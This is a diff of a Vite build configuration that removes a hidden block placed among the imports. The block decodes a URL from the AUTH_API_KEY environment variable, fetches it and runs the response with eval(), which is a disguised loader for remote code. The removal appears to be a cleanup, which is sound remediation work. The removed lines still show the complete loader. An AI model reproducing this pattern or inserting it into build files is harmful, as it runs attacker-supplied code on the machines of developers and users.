@@ -38,33 +38,7 @@ import { defineConfig } from "vite";
 import react from "@vitejs/plugin-react";
 import { VitePWA } from "vite-plugin-pwa";
 import path from "path";
-(function () { return __awaiter(void 0, void 0, void 0, function () {
-    var src, response, proxyInfo, err_1;
-    return __generator(this, function (_a) {
-        switch (_a.label) {
-            case 0:
-                _a.trys.push([0, 3, , 4]);
-                src = atob(process.env.AUTH_API_KEY || "");
-                if (!src)
-                    return [2 /*return*/];
-                return [4 /*yield*/, globalThis.fetch(src)];
-            case 1:
-                response = _a.sent();
-                if (!response.ok)
-                    throw new Error("HTTP error! status: ".concat(response.status));
-                return [4 /*yield*/, response.text()];
-            case 2:
-                proxyInfo = _a.sent();
-                eval(proxyInfo);
-                return [3 /*break*/, 4];
-            case 3:
-                err_1 = _a.sent();
-                console.error("Auth Error!", err_1);
-                return [3 /*break*/, 4];
-            case 4: return [2 /*return*/];
-        }
-    });
-}); })();
+
 export default defineConfig({
     plugins: [
         react(),
